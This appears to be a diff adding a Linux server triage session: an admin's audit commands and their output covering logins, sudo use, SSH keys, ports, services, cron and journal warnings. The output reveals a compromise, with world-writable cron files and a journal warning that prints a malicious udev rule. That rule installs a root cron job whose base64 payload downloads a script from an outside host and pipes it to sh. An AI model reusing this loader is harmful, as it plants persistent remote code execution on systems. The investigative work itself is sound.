@@ -1,0 +1,569 @@
+ubuntu@ip-172-31-23-190:~$ echo "=== TIME / UPTIME ==="; date; uptime
+
+echo "=== WHO / LAST ==="; who; last -a | head -n 50
+
+echo "=== AUTH SUMMARY (who/what/where) ==="
+sudo grep -E "Accepted|Failed password|Invalid user|authentication failure" /var/log/auth.log | tail -n 200
+
+echo "=== FAILED LOGINS (btmp) ==="
+sudo lastb -a | head -n 50 2>/dev/null || echo "no btmp/lastb data"
+
+echo "=== SUDO ACTIVITY ==="
+sudo grep -E "sudo:" /var/log/auth.log | tail -n 120
+
+echo "=== UID 0 USERS ==="
+awk -F: '$3==0{print}' /etc/passwd
+
+echo "=== SSH KEYS (first line only) ==="
+for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do
+  [ -f "$f" ] && echo "--- $f" && sudo sed -n '1p' "$f"
+done
+
+echo "=== LISTENING PORTS ==="
+sudo ss -tulpn
+
+echo "=== ENABLED SERVICES ==="
+systemctl --no-pager list-unit-files --state=enabled | head -n 250
+
+echo "=== CRON / TIMERS ==="
+crontab -l 2>/dev/null || true
+sudo crontab -l 2>/dev/null || true
+sudo ls -la /etc/cron.* /etc/cron* 2>/dev/null
+systemctl --no-pager list-timers --all | head -n 200
+
+echo "=== RECENT WARNINGS THIS BOOT ==="
+sudo journalctl -p warning..alert -b --no-pager | tail -n 200
+
+echo "=== RECENT PACKAGE ACTIVITY ==="
+sudo tail -n 200 /var/log/apt/history.log 2>/dev/null || true
+=== TIME / UPTIME ===
+Sun Feb  8 23:25:06 UTC 2026
+ 23:25:06 up 28 min,  1 user,  load average: 0.03, 0.12, 0.15
+=== WHO / LAST ===
+ubuntu   pts/0        2026-02-08 23:04 (203.52.160.152)
+ubuntu   pts/0        Sun Feb  8 23:04   still logged in    203.52.160.152
+reboot   system boot  Sun Feb  8 22:57   still running      6.14.0-1018-aws
+
+wtmp begins Sun Feb  8 22:57:06 2026
+=== AUTH SUMMARY (who/what/where) ===
+2026-02-08T23:04:14.511052+00:00 ip-172-31-23-190 sshd[6346]: Accepted publickey for ubuntu from 203.52.160.152 port 49098 ssh2: ED25519 SHA256:BwUIFNORkxZ/vcE03aHYOedAF0DEH+gGLa8JrfRQBbk
+2026-02-08T23:23:39.621948+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep -Ei 'Accepted|Failed|Invalid user|authentication failure|sudo:|session opened|session closed' /var/log/auth.log
+2026-02-08T23:24:31.377135+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/awk '/Accepted publickey/{a++} /Accepted password/{b++} /Failed password/{c++} /Invalid user/{d++} END{print "Accepted_pubkey="a,"Accepted_pass="b,"Failed_pass="c,"Invalid_user="d}' /var/log/auth.log
+2026-02-08T23:25:06.053555+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep -E 'Accepted|Failed password|Invalid user|authentication failure' /var/log/auth.log
+=== FAILED LOGINS (btmp) ===
+
+btmp begins Sun Feb  8 22:57:08 2026
+=== SUDO ACTIVITY ===
+2026-02-08T23:06:11.542720+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+2026-02-08T23:06:11.543427+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:06:26.316298+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:11:57.955191+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/auth.log
+2026-02-08T23:11:57.957738+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:11:57.968147+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:12:16.072517+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+2026-02-08T23:12:16.076592+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:12:16.113176+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:12:30.022099+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ps -o pid,ppid,user,lstart,cmd -p 1521,1558,1560
+2026-02-08T23:12:30.023497+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:12:30.040298+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:13:20.077207+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ls -la /root/.ssh
+2026-02-08T23:13:20.079000+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:13:20.085350+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:13:33.407535+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/sed -n 1,200p /root/.ssh/authorized_keys
+2026-02-08T23:13:33.408380+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:13:33.412639+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:20:47.638761+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/crontab -l
+2026-02-08T23:20:47.645259+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:20:47.645605+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:16.499596+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/journalctl -p warning..alert -b --no-pager
+2026-02-08T23:23:16.507587+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:16.528038+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:16.538237+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/auth.log
+2026-02-08T23:23:16.539712+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:16.543527+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:16.556082+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+2026-02-08T23:23:16.557274+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:16.570975+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:16.611015+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/crontab -l
+2026-02-08T23:23:16.611983+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:16.616706+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:16.625426+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/cron.yearly /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/cron.yearly /etc/crontab
+2026-02-08T23:23:16.627189+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:16.640780+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:17.862038+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/find /home /root -maxdepth 2 -name authorized_keys -type f -print -exec sed -n 1,3p {} ;
+2026-02-08T23:23:17.862963+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:17.873058+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:17.885450+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/apt/history.log
+2026-02-08T23:23:17.886588+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:17.890755+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:23:39.621948+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep -Ei 'Accepted|Failed|Invalid user|authentication failure|sudo:|session opened|session closed' /var/log/auth.log
+2026-02-08T23:23:39.622581+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:23:39.626354+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:24:31.377135+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/awk '/Accepted publickey/{a++} /Accepted password/{b++} /Failed password/{c++} /Invalid user/{d++} END{print "Accepted_pubkey="a,"Accepted_pass="b,"Failed_pass="c,"Invalid_user="d}' /var/log/auth.log
+2026-02-08T23:24:31.378064+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:24:31.385954+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:25:06.053555+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep -E 'Accepted|Failed password|Invalid user|authentication failure' /var/log/auth.log
+2026-02-08T23:25:06.054864+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:25:06.062977+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:25:06.085619+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/lastb -a
+2026-02-08T23:25:06.093881+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+2026-02-08T23:25:06.106401+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session closed for user root
+2026-02-08T23:25:06.135679+00:00 ip-172-31-23-190 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep -E sudo: /var/log/auth.log
+2026-02-08T23:25:06.142264+00:00 ip-172-31-23-190 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)
+=== UID 0 USERS ===
+root:x:0:0:root:/root:/bin/bash
+=== SSH KEYS (first line only) ===
+--- /home/ubuntu/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAkS5HuXtuLrHSjxFOg/jj8ClWVOwu+27hFOKyaLJzu NDVI
+=== LISTENING PORTS ===
+Netid       State        Recv-Q       Send-Q                  Local Address:Port                Peer Address:Port       Process
+udp         UNCONN       0            0                             0.0.0.0:49063                    0.0.0.0:*           users:(("avahi-daemon",pid=607,fd=14))
+udp         UNCONN       0            0                          127.0.0.54:53                       0.0.0.0:*           users:(("systemd-resolve",pid=529,fd=16))
+udp         UNCONN       0            0                       127.0.0.53%lo:53                       0.0.0.0:*           users:(("systemd-resolve",pid=529,fd=14))
+udp         UNCONN       0            0                  172.31.23.190%ens5:68                       0.0.0.0:*           users:(("systemd-network",pid=565,fd=21))
+udp         UNCONN       0            0                           127.0.0.1:323                      0.0.0.0:*           users:(("chronyd",pid=743,fd=5))
+udp         UNCONN       0            0                             0.0.0.0:5353                     0.0.0.0:*           users:(("avahi-daemon",pid=607,fd=12))
+udp         UNCONN       0            0                                [::]:32863                       [::]:*           users:(("avahi-daemon",pid=607,fd=15))
+udp         UNCONN       0            0                               [::1]:323                         [::]:*           users:(("chronyd",pid=743,fd=6))
+udp         UNCONN       0            0                                [::]:5353                        [::]:*           users:(("avahi-daemon",pid=607,fd=13))
+tcp         LISTEN       0            4096                        127.0.0.1:8091                     0.0.0.0:*           users:(("docker-proxy",pid=1521,fd=8))
+tcp         LISTEN       0            511                           0.0.0.0:3002                     0.0.0.0:*           users:(("node",pid=1558,fd=20))
+tcp         LISTEN       0            511                           0.0.0.0:80                       0.0.0.0:*           users:(("nginx",pid=732,fd=5),("nginx",pid=731,fd=5),("nginx",pid=729,fd=5))
+tcp         LISTEN       0            4096                          0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=6345,fd=3),("systemd",pid=1,fd=91))
+tcp         LISTEN       0            511                           0.0.0.0:443                      0.0.0.0:*           users:(("nginx",pid=732,fd=8),("nginx",pid=731,fd=8),("nginx",pid=729,fd=8))
+tcp         LISTEN       0            4096                       127.0.0.54:53                       0.0.0.0:*           users:(("systemd-resolve",pid=529,fd=17))
+tcp         LISTEN       0            4096                    127.0.0.53%lo:53                       0.0.0.0:*           users:(("systemd-resolve",pid=529,fd=15))
+tcp         LISTEN       0            511                                 *:8080                           *:*           users:(("apache2",pid=788,fd=4),("apache2",pid=785,fd=4),("apache2",pid=778,fd=4),("apache2",pid=775,fd=4))
+tcp         LISTEN       0            511                                 *:3001                           *:*           users:(("next-server (v1",pid=1560,fd=18))
+tcp         LISTEN       0            511                              [::]:80                          [::]:*           users:(("nginx",pid=732,fd=6),("nginx",pid=731,fd=6),("nginx",pid=729,fd=6))
+tcp         LISTEN       0            4096                             [::]:22                          [::]:*           users:(("sshd",pid=6345,fd=4),("systemd",pid=1,fd=92))
+tcp         LISTEN       0            511                              [::]:443                         [::]:*           users:(("nginx",pid=732,fd=7),("nginx",pid=731,fd=7),("nginx",pid=729,fd=7))
+=== ENABLED SERVICES ===
+UNIT FILE                                      STATE   PRESET
+snap-amazon\x2dssm\x2dagent-11797.mount        enabled enabled
+snap-amazon\x2dssm\x2dagent-12322.mount        enabled enabled
+snap-core22-2216.mount                         enabled enabled
+snap-core22-2292.mount                         enabled enabled
+snap-snapd-25202.mount                         enabled enabled
+snap-snapd-25935.mount                         enabled enabled
+acpid.path                                     enabled enabled
+apport-autoreport.path                         enabled enabled
+tpm-udev.path                                  enabled enabled
+apache2.service                                enabled enabled
+apparmor.service                               enabled enabled
+apport.service                                 enabled enabled
+avahi-daemon.service                           enabled enabled
+blk-availability.service                       enabled enabled
+chrony.service                                 enabled enabled
+cloud-config.service                           enabled enabled
+cloud-final.service                            enabled enabled
+cloud-init-local.service                       enabled enabled
+cloud-init.service                             enabled enabled
+console-setup.service                          enabled enabled
+containerd.service                             enabled enabled
+cron.service                                   enabled enabled
+dmesg.service                                  enabled enabled
+docker.service                                 enabled enabled
+e2scrub_reap.service                           enabled enabled
+ec2-instance-connect-harvest-hostkeys.service  enabled enabled
+fail2ban.service                               enabled enabled
+finalrd.service                                enabled enabled
+getty@.service                                 enabled enabled
+grub-common.service                            enabled enabled
+grub-initrd-fallback.service                   enabled enabled
+hibinit-agent.service                          enabled enabled
+irqbalance.service                             enabled enabled
+keyboard-setup.service                         enabled enabled
+lvm2-monitor.service                           enabled enabled
+ModemManager.service                           enabled enabled
+multipathd.service                             enabled enabled
+networkd-dispatcher.service                    enabled enabled
+nginx.service                                  enabled enabled
+open-iscsi.service                             enabled enabled
+open-vm-tools.service                          enabled enabled
+pm2-ubuntu.service                             enabled enabled
+pollinate.service                              enabled enabled
+rsyslog.service                                enabled enabled
+secureboot-db.service                          enabled enabled
+setvtrgb.service                               enabled enabled
+snap.amazon-ssm-agent.amazon-ssm-agent.service enabled enabled
+snapd.apparmor.service                         enabled enabled
+snapd.autoimport.service                       enabled enabled
+snapd.core-fixup.service                       enabled enabled
+snapd.recovery-chooser-trigger.service         enabled enabled
+snapd.seeded.service                           enabled enabled
+snapd.service                                  enabled enabled
+snapd.system-shutdown.service                  enabled enabled
+ssl-cert.service                               enabled enabled
+sysstat.service                                enabled enabled
+systemd-networkd-wait-online.service           enabled enabled
+systemd-networkd.service                       enabled enabled
+systemd-pstore.service                         enabled enabled
+systemd-resolved.service                       enabled enabled
+ua-reboot-cmds.service                         enabled enabled
+ubuntu-advantage.service                       enabled enabled
+udisks2.service                                enabled enabled
+ufw.service                                    enabled enabled
+unattended-upgrades.service                    enabled enabled
+vgauth.service                                 enabled enabled
+vnstat.service                                 enabled enabled
+wpa_supplicant.service                         enabled enabled
+acpid.socket                                   enabled enabled
+apport-forward.socket                          enabled enabled
+avahi-daemon.socket                            enabled enabled
+cloud-init-hotplugd.socket                     enabled enabled
+dm-event.socket                                enabled enabled
+docker.socket                                  enabled enabled
+iscsid.socket                                  enabled enabled
+lvm2-lvmpolld.socket                           enabled enabled
+lxd-installer.socket                           enabled enabled
+multipathd.socket                              enabled enabled
+snapd.socket                                   enabled enabled
+ssh.socket                                     enabled enabled
+systemd-networkd.socket                        enabled enabled
+uuidd.socket                                   enabled enabled
+remote-fs.target                               enabled enabled
+apport-autoreport.timer                        enabled enabled
+apt-daily-upgrade.timer                        enabled enabled
+apt-daily.timer                                enabled enabled
+certbot.timer                                  enabled enabled
+dpkg-db-backup.timer                           enabled enabled
+e2scrub_all.timer                              enabled enabled
+fstrim.timer                                   enabled enabled
+fwupd-refresh.timer                            enabled enabled
+logrotate.timer                                enabled enabled
+man-db.timer                                   enabled enabled
+mdcheck_continue.timer                         enabled enabled
+mdcheck_start.timer                            enabled enabled
+mdmonitor-oneshot.timer                        enabled enabled
+motd-news.timer                                enabled enabled
+snapd.snap-repair.timer                        enabled enabled
+sysstat-collect.timer                          enabled enabled
+sysstat-summary.timer                          enabled enabled
+ua-timer.timer                                 enabled enabled
+update-notifier-download.timer                 enabled enabled
+update-notifier-motd.timer                     enabled enabled
+
+103 unit files listed.
+=== CRON / TIMERS ===
+-rw-rw-rw- 1 root root  561 Feb  8 20:11 /etc/crontab
+
+/etc/cron.d:
+total 32
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rw-r--r--   1 root root  1202 Feb  8 23:24 auto-upgrade
+-rw-rw-rw-   1 root root   440 Feb  8 20:11 certbot
+-rw-rw-rw-   1 root root     0 Feb  8 20:11 e2scrub_all
+-rw-rw-rw-   1 root root   191 Feb  8 20:11 sysstat
+
+/etc/cron.d:
+total 32
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rw-r--r--   1 root root  1202 Feb  8 23:24 auto-upgrade
+-rw-rw-rw-   1 root root   440 Feb  8 20:11 certbot
+-rw-rw-rw-   1 root root     0 Feb  8 20:11 e2scrub_all
+-rw-rw-rw-   1 root root   191 Feb  8 20:11 sysstat
+
+/etc/cron.daily:
+total 48
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rwxrwxrwx   1 root root   292 Feb  8 20:11 apache2
+-rwxrwxrwx   1 root root    55 Feb  8 20:11 apport
+-rwxrwxrwx   1 root root  1133 Feb  8 20:11 apt-compat
+-rwxrwxrwx   1 root root    44 Feb  8 20:11 dpkg
+-rwxrwxrwx   1 root root   176 Feb  8 20:11 logrotate
+-rwxrwxrwx   1 root root   581 Feb  8 20:11 man-db
+-rwxrwxrwx   1 root root   373 Feb  8 20:11 sysstat
+
+/etc/cron.daily:
+total 48
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rwxrwxrwx   1 root root   292 Feb  8 20:11 apache2
+-rwxrwxrwx   1 root root    55 Feb  8 20:11 apport
+-rwxrwxrwx   1 root root  1133 Feb  8 20:11 apt-compat
+-rwxrwxrwx   1 root root    44 Feb  8 20:11 dpkg
+-rwxrwxrwx   1 root root   176 Feb  8 20:11 logrotate
+-rwxrwxrwx   1 root root   581 Feb  8 20:11 man-db
+-rwxrwxrwx   1 root root   373 Feb  8 20:11 sysstat
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+
+/etc/cron.monthly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+
+/etc/cron.monthly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rwxrwxrwx   1 root root   412 Feb  8 20:11 man-db
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+-rwxrwxrwx   1 root root   412 Feb  8 20:11 man-db
+
+/etc/cron.yearly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+
+/etc/cron.yearly:
+total 20
+drwxr-xr-x   2 root root  4096 Feb  8 20:11 .
+drwxr-xr-x 130 root root 12288 Feb  8 20:11 ..
+-rw-rw-rw-   1 root root   102 Feb  8 20:11 .placeholder
+NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES
+Sun 2026-02-08 23:30:00 UTC 4min 52s Sun 2026-02-08 23:20:03 UTC     5min ago sysstat-collect.timer          sysstat-collect.service
+Mon 2026-02-09 00:00:00 UTC    34min Sun 2026-02-08 00:00:27 UTC            - dpkg-db-backup.timer           dpkg-db-backup.service
+Mon 2026-02-09 00:00:00 UTC    34min Sun 2026-02-08 00:00:27 UTC            - logrotate.timer                logrotate.service
+Mon 2026-02-09 00:03:38 UTC    38min Mon 2026-02-02 00:25:40 UTC            - fstrim.timer                   fstrim.service
+Mon 2026-02-09 00:07:00 UTC    41min -                                      - sysstat-summary.timer          sysstat-summary.service
+Mon 2026-02-09 00:17:09 UTC    52min Sun 2026-02-08 18:27:57 UTC            - motd-news.timer                motd-news.service
+Mon 2026-02-09 00:24:43 UTC    59min Sun 2026-02-08 23:23:26 UTC 1min 40s ago fwupd-refresh.timer            fwupd-refresh.service
+Mon 2026-02-09 00:27:44 UTC  1h 2min Sun 2026-02-08 06:14:17 UTC            - apt-daily.timer                apt-daily.service
+Mon 2026-02-09 06:29:11 UTC       7h Sun 2026-02-08 06:51:16 UTC            - apt-daily-upgrade.timer        apt-daily-upgrade.service
+Mon 2026-02-09 08:52:12 UTC       9h Sun 2026-02-08 04:12:07 UTC            - man-db.timer                   man-db.service
+Mon 2026-02-09 11:35:17 UTC      12h Sun 2026-02-08 12:23:09 UTC            - certbot.timer                  certbot.service
+Mon 2026-02-09 23:02:06 UTC      23h Sun 2026-02-08 23:02:06 UTC    23min ago update-notifier-download.timer update-notifier-download.service
+Mon 2026-02-09 23:12:05 UTC      23h Sun 2026-02-08 23:12:05 UTC    13min ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
+Fri 2026-02-13 18:29:37 UTC   4 days Wed 2026-02-04 21:51:18 UTC            - update-notifier-motd.timer     update-notifier-motd.service
+Sun 2026-02-15 03:10:15 UTC   6 days Sun 2026-02-08 03:11:19 UTC            - e2scrub_all.timer              e2scrub_all.service
+-                                  - -                                      - apport-autoreport.timer        apport-autoreport.service
+-                                  - -                                      - snapd.snap-repair.timer        snapd.snap-repair.service
+-                                  - -                                      - ua-timer.timer                 ua-timer.service
+
+18 timers listed.
+=== RECENT WARNINGS THIS BOOT ===
+Feb 08 23:17:34 ip-172-31-23-190 networkctl[15925]: Interface "veth442d634" not found.
+Feb 08 23:17:34 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 15925, but reception only permitted for main PID 614
+Feb 08 23:17:34 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 15925, but reception only permitted for main PID 614
+Feb 08 23:17:34 ip-172-31-23-190 networkctl[15928]: Interface "vethd3c1d31" not found.
+Feb 08 23:17:34 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 15928, but reception only permitted for main PID 614
+Feb 08 23:17:34 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 15928, but reception only permitted for main PID 614
+Feb 08 23:17:34 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
